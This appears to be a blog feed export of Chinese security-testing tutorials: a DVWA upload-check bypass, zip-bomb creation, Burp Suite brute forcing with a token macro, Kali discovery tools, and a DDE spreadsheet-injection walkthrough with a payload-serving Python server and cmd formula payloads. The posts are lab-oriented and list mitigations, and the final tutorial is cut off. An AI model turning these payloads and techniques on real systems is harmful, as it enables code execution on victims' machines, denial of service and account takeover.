Upload 页面的源码，如下所示。可得知前台增加了一层逻辑，用来判断上传的文件类型是否是图片 (<code>image/jpeg</code> 和 <code>mage/png</code>)，并且上传文件的大小不能超过 100000 个字节。
</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'Upload'</span> ] ) ) {</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ];</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">"image/jpeg"</span> || <span class="variable">$uploaded_type</span> == <span class="string">"image/png"</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) {</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], <span class="variable">$target_path</span> ) ) {</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;<span class="subst">{$target_path}</span> succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>既然前台页面增加了对文件类型及大小的校验，那么，咱们可以先将原来的 <code>info.php</code> 直接修改后缀为 <code>info.jpg</code>，然后通过 burpsuite 工具拦截，再改回原来的 <code>php</code> 后缀名，查看能否绕过。
<img src="https://ae01.alicdn.com/kf/Ucc23e5783b9442c5a60eaab25df0d993F.jpg" alt="篡改请求中的文件后缀"></p></li>
<li><p>由下图可见，成功绕过了前台的校验，将非图片文件上传至了服务器，并获取到了系统信息。
<img src="https://ae01.alicdn.com/kf/U91f78ae78baf4c00a678bad050674617C.jpg" alt="篡改文件后缀后上传成功"> <img src="https://ae01.alicdn.com/kf/Ud4118e447d70428794226955405795870.jpg" alt="文件可成功执行"></p></li>
</ol>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>DVWA</tag>
        <tag>前后台校验</tag>
      </tags>
  </entry>
  <entry>
    <title>【Security】在 Linux 系统上制作高压缩比的 zip 炸弹</title>
    <url>/p/fc2617a9.html</url>
    <content><![CDATA[<h1 id="测试背景">1. 测试背景</h1>
<p>  在某些安全性较高的软件中，上传文件时会限制文件的大小、格式等，通常的实现方法是在前台对文件大小进行校验，或者在发起文件上传请求时，后台也做一校验，以防止被绕过前台校验的风险。
  本次所测试的场景，就是通过制作一个高压缩比的文件 (俗称 zip 炸弹)，来满足软件前后台校验的大小要求。由于原始文件很大，未做 zip 炸弹防范的软件，会在后台持续性地解压文件，从而造成 cpu、内存，磁盘等资源持续性高占用，进而产生拒绝服务攻击的风险。</p>
<span id="more"></span>
<hr>
<h1 id="文件制作">2. 文件制作</h1>
<ol type="1">
<li>进入 Linux 系统终端，输入如下命令。 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero count=$((<span class="number">1024</span>*<span class="number">1024</span>)) bs=4096 of=/home/bombfile.txt</span><br></pre></td></tr></tbody></table></figure> &gt; 命令解释： &gt;
-
if = 源文件名，如果没有文件内容要求，可以指定为系统自带的 0 源文件，制作好的文件内容也会是 0。
&gt; -
count=blocks，拷贝 blocks 个数据块，块大小取决于 bs 或 ibs 指定的字节数。 &gt;
- bs=bytes，同时设置输入 / 输出的数据块大小是 bytes 个字节。 &gt; -
of = 输出文件名，自己任取。</li>
</ol>
<figure>
<img src="/p/fc2617a9/制作大文件.webp" alt="制作大文件">
<figcaption aria-hidden="true">制作大文件</figcaption>
</figure>
<ol start="2" type="1">
<li>再输入如下命令，稍等一会儿，一个高压缩比的 zip 文件就制作好了。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">zip -9 bombfile.zip bombfile.txt</span><br></pre></td></tr></tbody></table></figure> &gt; 命令解释： &gt; - -9：设置压缩级别，9 最大，1 最小。
&gt; - bombfile.zip：输出压缩文件名 &gt; - bombfile.txt：压缩源文件</li>
</ol>
<figure>
<img src="/p/fc2617a9/文件压缩.webp" alt="文件压缩">
<figcaption aria-hidden="true">文件压缩</figcaption>
</figure>
<ol start="3" type="1">
<li>可以查看下生成的 zip 文件属性信息，如下图所示，将一个 4G 大小的文件压缩成了 4M 的压缩包。</li>
</ol>
<figure>
<img src="/p/fc2617a9/zip炸弹文件属性.webp" alt="zip炸弹文件属性">
<figcaption aria-hidden="true">zip 炸弹文件属性</figcaption>
</figure>
<hr>
<h1 id="参考资料">3. 参考资料</h1>
<p><a href="https://m.w3cschool.cn/linux/linux-comm-dd.html">Linux 系统 dd 命令</a>
<pangu> </pangu><a href="https://m.w3cschool.cn/linux/linux-comm-zip.html">Linux 系统 zip 命令</a></p>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>渗透测试</tag>
        <tag>zip炸弹</tag>
      </tags>
  </entry>
  <entry>
    <title>【Security】基于 Burpsuite 工具中的 intruder 执行暴力破解</title>
    <url>/p/4d632ce4.html</url>
    <content><![CDATA[<h1 id="测试工具">1. 测试工具</h1>
<table>
<colgroup>
<col style="width: 2%">
<col style="width: 4%">
<col style="width: 6%">
<col style="width: 86%">
</colgroup>
<thead>
<tr class="header">
<th>序号</th>
<th>工具</th>
<th>版本</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> 1</td>
<td>JDK 环境</td>
<td> 1.7 及以上</td>
<td> burpsuite 工具运行所需</td>
</tr>
<tr class="even">
<td> 2</td>
<td>Burpsuite</td>
<td>1.4 及以上</td>
<td>请根据个人情况，选择 Community 或 Professional 版本</td>
</tr>
<tr class="odd">
<td> 3</td>
<td>DVWA</td>
<td> 当前最新是 1.9</td>
<td> 集成多种渗透测试工具，可根据测试场景，调整应用程序的安全等级，环境部署参考：<a href="/p/bb712987.html" target="_blank">【安全】【测试工具搭建】Ubuntu 中基于 DVWA 程序搭建个人安全测试环境</a></td>
</tr>
</tbody>
</table>
<span id="more"></span>
<hr>
<h1 id="常规暴力破解">2. 常规暴力破解</h1>
<p>对于一般或中小型项目软件来说，用户进行登录操作时，发送的鉴权请求可能只有一条，以用户账号、密码、验证码（若有）作为入参，发送给服务器进行验证，根据鉴权结果返回登录失败或成功。此类登录请求，只需在 intruder 中选取请求中的密码参数作为载荷标记，配置好对应的载荷内容，即可执行破解操作。</p>
<h2 id="测试流程">2.1. 测试流程</h2>
<ol type="1">
<li>拦截登录请求，并发送到 intruder 中。</li>
</ol>
<figure>
<img src="/p/4d632ce4/登录请求发送至intruder.webp" alt="登录请求发送至intruder">
<figcaption aria-hidden="true">登录请求发送至 intruder</figcaption>
</figure>
<ol start="2" type="1">
<li> 选择攻击类型。</li>
</ol>
<table style="width:100%;">
<colgroup>
<col style="width: 10%">
<col style="width: 11%">
<col style="width: 49%">
<col style="width: 28%">
</colgroup>
<thead>
<tr class="header">
<th>Attack type<br>（类型）</th>
<th>Payload set<br>（载荷集）</th>
<th>描述</th>
<th>适用场景</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Sniper</td>
<td> 最多 1 个</td>
<td>单位置单遍历，即所有载荷标记使用同一个载荷集，每次攻击只替换一个载荷标记。攻击总数 = 载荷标记数量
* 载荷集清单数量</td>
<td>只有一个位置需要替换，或者多个位置依次替换</td>
</tr>
<tr class="even">
<td> Battering ram</td>
<td> 最多 1 个</td>
<td>多位置同时遍历，即所有载荷标记使用同一个载荷集，且每次攻击会同时替换所有载荷标记。
攻击总数 = 载荷集清单数量</td>
<td>存在多个位置需要替换，且多个位置被替换内容需要同时一致</td>
</tr>
<tr class="odd">
<td> Pitchfork</td>
<td> 至少 2 个</td>
<td>各个载荷标记使用对应的载荷集，每次同时取载荷集中的第 N 个元素替换对应的标记。攻击总数 = 所有载荷集清单最少数量</td>
<td> 2 个以上位置同时被替换，被替换的内容存在一一对应关系</td>
</tr>
<tr class="even">
<td> Cluster bomb</td>
<td> 至少 2 个</td>
<td>集束爆破，攻击总数等于所有载荷集清单数量的笛卡尔积。</td>
<td>2 个以上位置同时被替换，被替换的内容无需存在对应关系，可自由组合。</td>
</tr>
</tbody>
</table>
<figure>
<img src="/p/4d632ce4/攻击模式.webp" alt="攻击模式">
<figcaption aria-hidden="true">攻击模式</figcaption>
</figure>
<ol start="3" type="1">
<li>选取载荷标记。 &gt;
add：手动选取一个载荷标记位置，以成对的 § 符号标记起来。 &gt;
clear：清除所有的载荷标记位置。 &gt;
auto：工具自动选取需要被替换的标记位置。 &gt;
refresh：刷新编辑器中的内容，使之语法高亮。</li>
</ol>
<figure>
<img src="/p/4d632ce4/选取载荷标记.webp" alt="选取载荷标记">
<figcaption aria-hidden="true">选取载荷标记</figcaption>
</figure>
<ol start="4" type="1">
<li>添加载荷内容。 &gt;
paste：从系统粘贴板中获取数据，点击 paste 按钮添加。 &gt;
load：选择并读取本地文件，每一行作为一条数据。 &gt;
remove：移除所选数据。 &gt; clear：清除所有数据。 &gt;
add：单个数据添加。 &gt; add from
list：从工具自带的数据列表中添加。</li>
</ol>
<figure>
<img src="/p/4d632ce4/添加载荷内容.webp" alt="添加载荷内容">
<figcaption aria-hidden="true">添加载荷内容</figcaption>
</figure>
<ol start="5" type="1">
<li>执行破解，查看破解请求。 点击 Start
attack 按钮，即可开始破解（为了提高破解几率，可先在 options 中将线程数设置为 1）。
从图中可发现，在执行第 86 次替换时，返回的长度 length 比其他的要少；再通过查看该攻击请求的返回报文，发现该请求已经正确返回了登录后的网页源码；与此同时，在所有的攻击请求中，没有一条返回 “账号被锁定” 或 “IP 地址被锁定” 的错误信息（<strong><em>具体返回内容，请根据项目实际情况判断</em></strong>）。
故由此得出，该系统的登录模块，未做任何防暴力破解的措施，极易被破解出密码。</li>
</ol>
<figure>
<img src="/p/4d632ce4/执行破解.webp" alt="执行破解">
<figcaption aria-hidden="true">执行破解</figcaption>
</figure>
<hr>
<h1 id="特殊登录请求暴力破解">3. 特殊登录请求暴力破解</h1>
<ol type="1">
<li>在接触到的某些大型项目中，为了进一步提高项目的安全防护，可能会在登录验证请求之前，先向服务器发送一条获取随机值的请求，服务器返回随机值后，登录验证请求会携带此随机值，连同登录用户账号、密码、验证码（若有），一同发送给服务器进行鉴权验证，并且此随机值长度一般可达到 32 位或以上，同时可能存在时间限制，以此来达到双重保障安全登录及长时间未登录销毁登录会话的目的。
  模拟登录流程如下：</li>
</ol>
<figure>
<img src="/p/4d632ce4/基于会话有效期的登录请求流程.webp" alt="基于会话有效期的登录请求流程">
<figcaption aria-hidden="true">基于会话有效期的登录请求流程</figcaption>
</figure>
<ol start="2" type="1">
<li>如果此时咱们使用上述的常规暴力破解方式，未将登录随机值放入登录请求中，服务器一般会返回 “登录会话失效” 或者 “登录随机值已过期” 等等消息，而此类测试结果并不能作为项目存在防暴力破解机制的依据。</li>
</ol>
<figure>
<img src="/p/4d632ce4/同一user_token发起登录请求验证.webp" alt="同一user_token发起登录请求验证">
<figcaption aria-hidden="true">同一 user_token 发起登录请求验证</figcaption>
</figure>
<ol start="3" type="1">
<li>因此，咱们可以使用到 burpsuite 工具中自带的宏录制的功能，将获取随机值的请求录制成宏，然后再将宏命令应用到 intruder 功能中，便可让登录请求入参携带由服务器返回的随机值，达到 “欺骗” 服务器正常登录的目的。</li>
</ol>
<h2 id="测试流程-1">3.1. 测试流程</h2>
<blockquote>
<p>大体流程与常规破解一致，区别在于前期的配置宏命令 (步骤 4~10)。 1.
以 DVWA 程序中的 Brute
Force 为例，输入 username 和 password，点击 Login 按钮，触发一次登录请求。</p>
</blockquote>
<figure>
<img src="/p/4d632ce4/发起登录请求.webp" alt="发起登录请求">
<figcaption aria-hidden="true">发起登录请求</figcaption>
</figure>
<ol start="2" type="1">
<li>在 burpsuite 中可看出，登录请求中的参数，不仅包含了用户名、密码，还包含了一条 user_token，并且是随机的。</li>
</ol>
<figure>
<img src="/p/4d632ce4/分析登录请求1.webp" alt="分析登录请求1">
<figcaption aria-hidden="true">分析登录请求 1</figcaption>
</figure>
<ol start="3" type="1">
<li><p> 登录失败后，在获取新页面的返回报文中，可看到新生成了一条 user_token。<br>
<img src="/p/4d632ce4/分析登录请求2.webp" alt="分析登录请求2"></p></li>
<li><p>进入 Project
options-&gt;Sessions-&gt;Marcos 中，点击 Add 新增一条 Marco。</p></li>
</ol>
<figure>
<img src="/p/4d632ce4/新增一条Macro.webp" alt="新增一条Macro">
<figcaption aria-hidden="true">新增一条 Macro</figcaption>
</figure>
<ol start="5" type="1">
<li> 在 Macro Editior 界面中，点击 Record
macro 按钮，在弹出的窗口中，选择那条获取登录随机值的请求，点击 OK。</li>
</ol>
<p><img src="/p/4d632ce4/配置获取随机值的请求.webp" alt="配置获取随机值的请求"> 6. 在 Macro Editior 界面中，输入 Macro
description，在 Macro items 中选择上述保存的请求，点击 Configure
item 按钮进入 Configure Macro Item 界面。</p>
<figure>
<img src="/p/4d632ce4/配置宏命令位置.webp" alt="配置宏命令位置">
<figcaption aria-hidden="true">配置宏命令位置</figcaption>
</figure>
<ol start="7" type="1">
<li>点击 Add 按钮，在弹出的 Define Custom
Paramter 界面中，选择那串 user_token 随机值，工具将自动填写随机值的起止位置表达式，记录下来备用。点击 OK 按钮保存，回到工具主界面。</li>
</ol>
<figure>
<img src="/p/4d632ce4/配置随机值位置.webp" alt="配置随机值位置">
<figcaption aria-hidden="true">配置随机值位置</figcaption>
</figure>
<ol start="8" type="1">
<li>在 Project options 的 Session Handling
Rules 中，新增一条规则。在弹出的 Session handling rule
editor 窗口中，取一个规则的名字，在 Rule Actions 中点击 Add，选择 Run a
macro。</li>
</ol>
<figure>
<img src="/p/4d632ce4/新建会话处理规则.webp" alt="新建会话处理规则">
<figcaption aria-hidden="true">新建会话处理规则</figcaption>
</figure>
<ol start="9" type="1">
<li>在 Session handling action
editor 中，自动填上了第 1~4 步配置的 macro，选中即可，下面的选项保持默认。点击 OK 按钮保存。</li>
</ol>
<figure>
<img src="/p/4d632ce4/配置会话处理动作.webp" alt="配置会话处理动作">
<figcaption aria-hidden="true">配置会话处理动作</figcaption>
</figure>
<ol start="10" type="1">
<li>返回到 Session handling rule
editor 窗口，切换到 Scope 页签。确保规则应用的工具包含 Intruder，URL
Scope 中选择 “Include all URLs” 选项。点击 OK 按钮以保存。</li>
</ol>
<figure>
<img src="/p/4d632ce4/选择规则应用的范围.webp" alt="选择规则应用的范围">
<figcaption aria-hidden="true">选择规则应用的范围</figcaption>
</figure>
<ol start="11" type="1">
<li>至此，宏命令的配置就完成了，接下来的 intruder 配置和执行破解操作，与<code>常规暴力破解</code>章节的步骤类似，不再赘述。</li>
</ol>
<h2 id="测试验证">3.2. 测试验证</h2>
<ol type="1">
<li>在发起的 Intruder 中，可看到每一次发起的破解请求中，其携带的 user_token 都是不同的，且有效（如果随机值无效会返回 HTTP302
Not Found）。</li>
<li>返回报文中，可看到返回的消息是账号或密码不正确，且 smithy 账号由于尝试登录错误次数过多，已被锁定了。</li>
</ol>
<figure>
<img src="/p/4d632ce4/破解请求1.webp" alt="破解请求1">
<figcaption aria-hidden="true">破解请求 1</figcaption>
</figure>
<figure>
<img src="/p/4d632ce4/破解请求2.webp" alt="破解请求2">
<figcaption aria-hidden="true"> 破解请求 2</figcaption>
</figure>
<figure>
<img src="/p/4d632ce4/破解结果.webp" alt="破解结果">
<figcaption aria-hidden="true"> 破解结果</figcaption>
</figure>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>暴力破解</tag>
        <tag>Burpsuite</tag>
        <tag>intruder</tag>
      </tags>
  </entry>
  <entry>
    <title>【Security】基于 Kali 操作系统的常用安全测试工具学习与使用（更新中）</title>
    <url>/p/a6bafcf7.html</url>
    <content><![CDATA[<h1 id="信息收集类">1. 信息收集类</h1>
<h2 id="存活主机识别">1.1. 存活主机识别</h2>
<h3 id="arping">1.1.1. arping</h3>
<p>arping 工具通过 ARP 协议（Address Resolution
Protocol，地址解析协议），由源主机向同一个以太网（局域网）内的目标主机发送 ARP 请求，以此获取目标主机 IP 地址对应的 MAC 地址。
例如，执行命令 <code>arping 192.168.88.10</code>，通过抓包可看到，源主机（192.168.88.11）在局域网内一广播模式发送 ARP 请求，询问 192.168.88.10 在哪，目标主机则进行了响应，将自己的 MAC 地址信息通过 ARP 协议返回给了源主机。</p>
<p>arping 工具可携带的常用参数及用途如下。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">-0：以0.0.0.0作为源IP地址（注意：有可能获取不到MAC地址是否存活）</span><br><span class="line">-b：以255.255.255.255作为源IP地址（注意：有可能获取不到arping响应）</span><br><span class="line">-c：指定发送arp请求次数，达到次数后停止</span><br><span class="line">-C：指定等待响应次数，达到次数后停止</span><br><span class="line">-d：测试是否存在ARP欺骗，例如多个数据包由同一个IP地址返回，但MAC地址不一样，则可能存在ARP欺骗</span><br><span class="line">-i：指定发送arp请求的网卡接口名称</span><br><span class="line">-q：仅显示错误信息</span><br><span class="line">-r：仅显示每次响应的目标主机MAC地址信息</span><br><span class="line">-R：仅显示每次响应的目标主机IP地址信息，可与-r组合使用</span><br><span class="line">-s：通过指定局域网内的网关或主机的MAC地址进行arping测试</span><br><span class="line">-S：通过指定局域网内的网关或主机的IP地址进行arping测试</span><br><span class="line">-u：同时显示发送/接收的index索引信息</span><br><span class="line">-w：指定发送或接收多少个数据包后停止</span><br><span class="line">-W：指定ping测试之间的等待时间间隔，单位为妙</span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="fping">1.1.2. fping</h3>
<p>fping 与咱们常用的 ping 工具有点类似，基于 ICMP 协议（Internet Control
Message
Protocol，网络控制信息协议）来探测目标主机是否存活，但 fping 在对多目标主机进行 ping 测试时，不会因为某个主机没有 ping 通过而一直等待，而是会继续对下一个目标主机发送数据包，从而实现多目标主机同时 ping 测试。</p>
<p>通过执行命令 <code>fping 10.10.10.111 -c 5</code>，使用 wireshark 工具抓包可看到，源主机向目标主机发送了 ICMP 协议请求，目标主机也向源主机发送了响应。</p>
<p>fping 工具的常用参数及用途如下。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">-4/6：仅ping测试IPv4/IPv6地址</span><br><span class="line">-b：指定ping测试发送的数据包大小，默认56Bytes</span><br><span class="line">-c：指定ping测试次数</span><br><span class="line">-f：指定ping测试的目标主机，通过文件读取（注意：不能与-g同时使用）</span><br><span class="line">-g：指定ping测试的目标主机范围。例如fping -g 192.168.88.10 192.168.88.50，或以掩码形式：fping -g 192.168.88.0/24</span><br><span class="line">-l：loop模式，持续发送ping测试数据包</span><br><span class="line">-p：指定时间间隔，对同一个目标主机进行连续发送ping测试时有效，loop模式或指定次数时默认间隔1秒</span><br><span class="line">-r：指定重试次数，未指定时默认重试3次</span><br><span class="line">-R：随机生成数据包内容</span><br><span class="line">-a：输出存活的目标主机，只会显示总的测试结果</span><br><span class="line">-A：以IP地址的形式输出目标主机</span><br><span class="line">-C：类似于`-c`，指定ping测试次数，但在结束时会再次打印所有ping的响应时间</span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>安全测试工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【Security】文件上传下载之绕过上传时内容校验的 DDE 注入攻击</title>
    <url>/p/4cf95082.html</url>
    <content><![CDATA[<h1 id="dde注入介绍">1. DDE 注入介绍</h1>
<p>  DDE（Dynamic Data
Exchange，动态数据交换）是应用之间传输数据的一种方法。Excel 可以使用这种机制，根据外部应用的处理结果来更新单元格的内容。因此，如果我们制作包含 (恶意) DDE 公式的 xlsx/csv 文件，那么在打开该文件时，Excel 就会尝试执行外部应用，以达到攻击的目的。</p>
<span id="more"></span>
<hr>
<h1 id="测试流程图">2. 测试流程图</h1>
<ol type="1">
<li>攻击者搭建一个 http 服务器，当有人访问指定的 URL 地址时，固定返回 DDE 注入命令。</li>
<li>制作一个可以读取 http 服务器的 xls/xlsx 文件，并上传到系统软件中。</li>
<li>用户在不知情的情况下，下载 xls/xlsx 文件。</li>
<li>用户双击打开后，文件中的某个单元格自动访问 URL 地址，获取到 DDE 注入命令后，触发命令的执行。</li>
</ol>
<figure>
<img src="/p/4cf95082/测试流程图.webp" alt="测试流程图">
<figcaption aria-hidden="true">测试流程图</figcaption>
</figure>
<hr>
<h1 id="测试步骤">3. 测试步骤</h1>
<h2 id="服务器搭建">3.1. 服务器搭建</h2>
<h3 id="参考代码">3.1.1. 参考代码</h3>
<p>在这里，咱们可以使用 python 搭建一个 http 服务器，用于发送攻击脚本。参考代码如下，其中的端口号和 DDE 注入命令可根据需要进行设置。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="string">"""=================================================</span></span><br><span class="line"><span class="string">@Author ：Fantasy_Boyce</span></span><br><span class="line"><span class="string">@Date   ：2020-07-25 23:08</span></span><br><span class="line"><span class="string">@Desc   ：</span></span><br><span class="line"><span class="string">=================================================="""</span></span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">            <span class="variable language_">self</span>.send_header(<span class="string">'Content-type'</span>, <span class="string">'text/html'</span>)</span><br><span class="line">            <span class="variable language_">self</span>.end_headers()</span><br><span class="line">            <span class="variable language_">self</span>.wfile.write(<span class="string">b"=cmd|'/c calc' !A0"</span>) <span class="comment"># DDE注入脚本内容</span></span><br><span class="line">        <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="variable language_">self</span>.send_error(<span class="number">404</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">global</span> myserver</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        myserver = HTTPServer((<span class="string">''</span>, <span class="number">8001</span>), MyHandler)</span><br><span class="line">        myserver.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        myserver.socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'starting http server...'</span>)</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="攻击脚本参考">3.1.2. 攻击脚本参考</h3>
<figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">=cmd|<span class="string">'/c calc'</span> !A0		<span class="comment"># 打开计算器</span></span><br><span class="line">=cmd|<span class="string">'/k ipconfig'</span> !A0		<span class="comment"># 打开cmd，查看系统IP地址</span></span><br><span class="line">%0A-3+3+cmd|<span class="string">'/C calc'</span> !A0	<span class="comment"># 当%0A被解析时，后面的内容将会填入下一行，并且打开计算器</span></span><br><span class="line">;-3+3+cmd|<span class="string">'/C calc'</span> !A0		<span class="comment"># 当导出为csv文件时，则可使用分号分隔，分号后面的命令将被执行 </span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="脚本启动">3.1.3. 脚本启动</h3>
<figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">python3 ftpserver.py</span><br></pre></td></tr></tbody></table></figure>
<h3 id="服务器访问效果">3.1.4. 服务器访问效果</h3>
<p>通过浏览器访问 http://{服务器 IP}:8001，可看到界面直接返回显示了 DDE 注入命令内容，表示服务器可正常访问。</p>
<figure>
<img src="/p/4cf95082/URL访问效果.webp" alt="URL访问效果">
<figcaption aria-hidden="true">URL 访问效果</figcaption>
</figure>
<h2 id="上传文件准备">3.2. 上传文件准备</h2>
<ol type="1">
<li>新建一个 xlsx 文件，点击任意单元格，切换到数据标签页，点击自网站，在弹出的对话框中，输入 http 服务器的 URL 地址，点击确定。</li>
</ol>
<figure>
<img src="/p/4cf95082/单元格数据来源设置.webp" alt="单元格数据来源设置">
<figcaption aria-hidden="true">单元格数据来源设置</figcaption>
</figure>
<ol start="2" type="1">
<li>点击【导入】按钮，在新的对话框中，点击属性，勾选如下红框中的两项，点击【确定】按钮，并保存 excel 文件，一个包含隐形 dde 注入的文件就做好了。</li>
</ol>
<figure>
<img src="/p/4cf95082/单元格数据属性设置.webp" alt="单元格数据属性设置">
<figcaption aria-hidden="true">单元格数据属性设置</figcaption>
</figure>
<h2 id="执行攻击">3.3. 执行攻击</h2>
<p>下面咱们来验证一下，假设另外一个用户下载了这个文件，并双击打开了，页面提示远程数据不可访问时，点击 "是"，可看到系统自动打开了计算器，说明命令被成功执行。</p>
<figure>
<img src="/p/4cf95082/实现效果.webp" alt="实现效果">
<figcaption aria-hidden="true">实现效果</figcaption>
</figure>
<p>再切换到 http 服务器上，http 服务器接收到了一条 get 请求，返回状态码 200。</p>
<figure>
<img src="./【Security】文件上传下载之绕过上传时内容校验的DDE注入攻击/http服务器状态监控.webp" alt="http服务器状态监控">
<figcaption aria-hidden="true">http 服务器状态监控</figcaption>
</figure>
<hr>
<h1 id="规避方案">4. 规避方案</h1>
<p>在文件上传时，读取文件，避免用户输入 -、+、= 等包含计算公式及危险命令的内容。
&gt; 可能会影响单元格包含计算公式的文件上传，对用户造成困扰。</p>
<p>在文件导出时，自动在单元格内容之前加入单引号，打破 DDE 注入命令的格式。
&gt; 加入单引号后，可能会改变原单元格中的数据内容。</p>
<p>在文件导出时，自动在单元格内容之前加入一个空格，打破 DDE 注入命令的格式。
&gt;
一般不会改变原单元格的内容，当系统以空格作为数据分隔符时，导出文件内容排版会有影响。</p>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>上传下载</tag>
        <tag>DDE注入</tag>
      </tags>
  </entry>
  <entry>
    <title>【Tutorials】2021 年初自制固件 iPhone4s 降级 IOS6</title>
    <url>/p/e21ad6f3.html</url>
    <content><![CDATA[<h1 id="说明">1. 说明</h1>
<p>  本降级操作是基于爱思助手工具，针对 IOS 9.3.6
版本的 iPhone4s，通过越狱、刷自制固件等步骤，降级至 IOS6.1.3 版本。
  降级时间：2021 年 01 月 17 日。   视频参考链接：<a href="https://www.bilibili.com/video/BV165411n7Nf/">【iPhone4s 降级】2021 年初自制固件降级 IOS6.1.3</a></p>
<span id="more"></span>
<hr>
<h1 id="设备信息">2. 设备信息</h1>
<figure>
<img src="/p/e21ad6f3/sRP55R.webp" alt="设备信息">
<figcaption aria-hidden="true">设备信息</figcaption>
</figure>
<hr>
<h1 id="准备工作">3. 准备工作</h1>
<table>
<colgroup>
<col style="width: 2%">
<col style="width: 11%">
<col style="width: 85%">
</colgroup>
<thead>
<tr class="header">
<th>序号</th>
<th>名称</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> 1</td>
<td>PC 电脑</td>
<td> Windows10，需提前安装 iTunes 和爱思助手</td>
</tr>
<tr class="even">
<td> 2</td>
<td>iOS6.1.3 版本固件</td>
<td>需要自制固件，官方固件刷机可能无法刷入，<a href="http://d.updater.i4.cn/i4tools7/temp/ota_downgrade/ota_iPhone4,1.ipsw">点我下载</a></td>
</tr>
<tr class="odd">
<td> 3</td>
<td> 爱思助手</td>
